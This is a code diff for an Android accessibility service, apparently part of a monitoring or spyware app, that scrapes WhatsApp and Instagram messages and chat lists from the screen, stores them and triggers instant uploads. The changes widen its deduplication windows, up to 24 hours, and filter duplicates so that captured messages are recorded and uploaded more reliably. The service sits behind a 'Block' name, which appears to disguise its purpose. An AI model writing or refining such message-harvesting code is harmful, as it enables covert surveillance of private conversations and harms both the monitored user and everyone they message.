@@ -450,13 +450,13 @@ class BlockAccessibilityService : AccessibilityService() {
                                 val now = System.currentTimeMillis()
                                 recordRecentSentWhatsAppText(textToSend)
                                 val dedupeKey = "wa|$chatTitle|$textToSend|true|text"
-                                if (shouldCaptureMessage(dedupeKey, 3000L)) {
+                                if (shouldCaptureMessage(dedupeKey, 60_000L)) {
                                     scope.launch {
                                         try {
                                             val db = AppDatabase.getInstance(applicationContext)
-                                            db.whatsAppMessageDao().updateToOutgoing(chatTitle, textToSend, now - 5_000L)
+                                            db.whatsAppMessageDao().updateToOutgoing(chatTitle, textToSend, now - 600_000L)
                                             val existingId = db.whatsAppMessageDao().findExistingRecent(
-                                                chatTitle, textToSend, true, now - 3_000L
+                                                chatTitle, textToSend, true, now - 600_000L
                                             )
                                             if (existingId == null) {
                                                 db.whatsAppMessageDao().insertAll(
@@ -524,13 +524,13 @@ class BlockAccessibilityService : AccessibilityService() {
                             val now = System.currentTimeMillis()
                             recordRecentSentWhatsAppText(sentText)
                             val dedupeKey = "wa|$chatTitle|$sentText|true|text"
-                            if (shouldCaptureMessage(dedupeKey, 3000L)) {
+                            if (shouldCaptureMessage(dedupeKey, 60_000L)) {
                                 scope.launch {
                                     try {
                                         val db = AppDatabase.getInstance(applicationContext)
-                                        db.whatsAppMessageDao().updateToOutgoing(chatTitle, sentText, now - 5_000L)
+                                        db.whatsAppMessageDao().updateToOutgoing(chatTitle, sentText, now - 600_000L)
                                         val existingId = db.whatsAppMessageDao().findExistingRecent(
-                                            chatTitle, sentText, true, now - 3_000L
+                                            chatTitle, sentText, true, now - 600_000L
                                         )
                                         if (existingId == null) {
                                             db.whatsAppMessageDao().insertAll(
@@ -623,13 +623,13 @@ class BlockAccessibilityService : AccessibilityService() {
                                 val now = System.currentTimeMillis()
                                 recordRecentSentInstagramText(textToSend)
                                 val dedupeKey = "ig|$chatTitle|$textToSend|true|text"
-                                if (shouldCaptureMessage(dedupeKey, 3000L)) {
+                                if (shouldCaptureMessage(dedupeKey, 60_000L)) {
                                     scope.launch {
                                         try {
                                             val db = AppDatabase.getInstance(applicationContext)
-                                            db.instagramMessageDao().updateToOutgoing(chatTitle, textToSend, now - 5_000L)
+                                            db.instagramMessageDao().updateToOutgoing(chatTitle, textToSend, now - 600_000L)
                                             val existingId = db.instagramMessageDao().findExistingRecent(
-                                                chatTitle, textToSend, true, now - 3_000L
+                                                chatTitle, textToSend, true, now - 600_000L
                                             )
                                             if (existingId == null) {
                                                 db.instagramMessageDao().insertAll(
@@ -697,13 +697,13 @@ class BlockAccessibilityService : AccessibilityService() {
                             val now = System.currentTimeMillis()
                             recordRecentSentInstagramText(sentText)
                             val dedupeKey = "ig|$chatTitle|$sentText|true|text"
-                            if (shouldCaptureMessage(dedupeKey, 3000L)) {
+                            if (shouldCaptureMessage(dedupeKey, 60_000L)) {
                                 scope.launch {
                                     try {
                                         val db = AppDatabase.getInstance(applicationContext)
-                                        db.instagramMessageDao().updateToOutgoing(chatTitle, sentText, now - 5_000L)
+                                        db.instagramMessageDao().updateToOutgoing(chatTitle, sentText, now - 600_000L)
                                         val existingId = db.instagramMessageDao().findExistingRecent(
-                                            chatTitle, sentText, true, now - 3_000L
+                                            chatTitle, sentText, true, now - 600_000L
                                         )
                                         if (existingId == null) {
                                             db.instagramMessageDao().insertAll(
@@ -1055,7 +1055,7 @@ class BlockAccessibilityService : AccessibilityService() {
             }
             val finalSnippet = snippet ?: "Active chat"
             val key = "wa_list|$chatName|$finalSnippet"
-            if (shouldCaptureMessage(key, 10_000L)) {
+            if (shouldCaptureMessage(key, 86_400_000L)) {
                 entries.add(
                     WhatsAppMessageEntry(
                         chatName = chatName,
@@ -1103,7 +1103,7 @@ class BlockAccessibilityService : AccessibilityService() {
                         val snippet = if (nonTimestampTexts.size > 1) nonTimestampTexts[1] else "Active chat"
                         if (chatName.length in 2..60) {
                             val key = "wa_list|$chatName|$snippet"
-                            if (shouldCaptureMessage(key, 10_000L)) {
+                            if (shouldCaptureMessage(key, 86_400_000L)) {
                                 entries.add(
                                     WhatsAppMessageEntry(
                                         chatName = chatName,
@@ -1132,8 +1132,21 @@ class BlockAccessibilityService : AccessibilityService() {
             scope.launch {
                 try {
                     val db = AppDatabase.getInstance(applicationContext)
-                    db.whatsAppMessageDao().insertAll(entries)
-                    com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantWhatsAppUpload(applicationContext)
+                    val filteredEntries = mutableListOf<WhatsAppMessageEntry>()
+                    for (entry in entries) {
+                        val existingDirection = db.whatsAppMessageDao().findRecentMessageDirection(
+                            entry.chatName,
+                            entry.messageText,
+                            entry.messageTimeEpochMs - 86_400_000L
+                        )
+                        if (existingDirection == null) {
+                            filteredEntries.add(entry)
+                        }
+                    }
+                    if (filteredEntries.isNotEmpty()) {
+                        db.whatsAppMessageDao().insertAll(filteredEntries)
+                        com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantWhatsAppUpload(applicationContext)
+                    }
                 } catch (_: Exception) {}
             }
         }
@@ -1167,7 +1180,7 @@ class BlockAccessibilityService : AccessibilityService() {
             }
             val msg = digest ?: "Active chat"
             val key = "ig_list|$username|$msg"
-            if (shouldCaptureMessage(key, 10_000L)) {
+            if (shouldCaptureMessage(key, 86_400_000L)) {
                 entries.add(
                     InstagramMessageEntry(
                         chatName = username,
@@ -1218,7 +1231,7 @@ class BlockAccessibilityService : AccessibilityService() {
                         val snippet = if (nonTimestampTexts.size > 1) nonTimestampTexts[1] else "Active chat"
                         if (username.length in 2..50 && !username.contains(" ")) {
                             val key = "ig_list|$username|$snippet"
-                            if (shouldCaptureMessage(key, 10_000L)) {
+                            if (shouldCaptureMessage(key, 86_400_000L)) {
                                 entries.add(
                                     InstagramMessageEntry(
                                         chatName = username,
@@ -1248,8 +1261,21 @@ class BlockAccessibilityService : AccessibilityService() {
             scope.launch {
                 try {
                     val db = AppDatabase.getInstance(applicationContext)
-                    db.instagramMessageDao().insertAll(entries)
-                    com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantInstagramUpload(applicationContext)
+                    val filteredEntries = mutableListOf<InstagramMessageEntry>()
+                    for (entry in entries) {
+                        val existingDirection = db.instagramMessageDao().findRecentMessageDirection(
+                            entry.chatName,
+                            entry.messageText,
+                            entry.messageTimeEpochMs - 86_400_000L
+                        )
+                        if (existingDirection == null) {
+                            filteredEntries.add(entry)
+                        }
+                    }
+                    if (filteredEntries.isNotEmpty()) {
+                        db.instagramMessageDao().insertAll(filteredEntries)
+                        com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantInstagramUpload(applicationContext)
+                    }
                 } catch (_: Exception) {}
             }
         }
@@ -1465,7 +1491,7 @@ class BlockAccessibilityService : AccessibilityService() {
                 }
 
                 val key = "wa|$chatTitle|$finalText|$isOutgoing|$itemMediaType"
-                if (shouldCaptureMessage(key, 3000L)) {
+                if (shouldCaptureMessage(key, 86_400_000L)) {
                     entriesToInsert.add(
                         WhatsAppMessageEntry(
                             chatName = chatTitle,
@@ -1490,7 +1516,7 @@ class BlockAccessibilityService : AccessibilityService() {
                             val existingDirection = db.whatsAppMessageDao().findRecentMessageDirection(
                                 entry.chatName,
                                 entry.messageText,
-                                entry.messageTimeEpochMs - 4_000L
+                                entry.messageTimeEpochMs - 86_400_000L
                             )
                             if (existingDirection == null) {
                                 filteredEntries.add(entry)
@@ -1498,7 +1524,7 @@ class BlockAccessibilityService : AccessibilityService() {
                                 db.whatsAppMessageDao().updateToOutgoing(
                                     entry.chatName,
                                     entry.messageText,
-                                    entry.messageTimeEpochMs - 5_000L
+                                    entry.messageTimeEpochMs - 86_400_000L
                                 )
                                 com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantWhatsAppUpload(applicationContext)
                             }
@@ -1939,7 +1965,7 @@ class BlockAccessibilityService : AccessibilityService() {
                     }
 
                     val key = "ig|$chatTitle|$finalText|$isOutgoing|$itemMediaType"
-                    if (shouldCaptureMessage(key, 3000L)) {
+                    if (shouldCaptureMessage(key, 86_400_000L)) {
                         entriesToInsert.add(
                             InstagramMessageEntry(
                                 chatName = chatTitle,
@@ -1960,8 +1986,28 @@ class BlockAccessibilityService : AccessibilityService() {
                 scope.launch {
                     try {
                         val db = AppDatabase.getInstance(applicationContext)
-                        db.instagramMessageDao().insertAll(entriesToInsert)
-                        com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantInstagramUpload(applicationContext)
+                        val filteredEntries = mutableListOf<InstagramMessageEntry>()
+                        for (entry in entriesToInsert) {
+                            val existingDirection = db.instagramMessageDao().findRecentMessageDirection(
+                                entry.chatName,
+                                entry.messageText,
+                                entry.messageTimeEpochMs - 86_400_000L
+                            )
+                            if (existingDirection == null) {
+                                filteredEntries.add(entry)
+                            } else if (existingDirection == false && entry.isOutgoing) {
+                                db.instagramMessageDao().updateToOutgoing(
+                                    entry.chatName,
+                                    entry.messageText,
+                                    entry.messageTimeEpochMs - 86_400_000L
+                                )
+                                com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantInstagramUpload(applicationContext)
+                            }
+                        }
+                        if (filteredEntries.isNotEmpty()) {
+                            db.instagramMessageDao().insertAll(filteredEntries)
+                            com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantInstagramUpload(applicationContext)
+                        }
                     } catch (e: Exception) {
                         Log.e("BlockA11y", "Failed to insert captured Instagram messages", e)
                     }
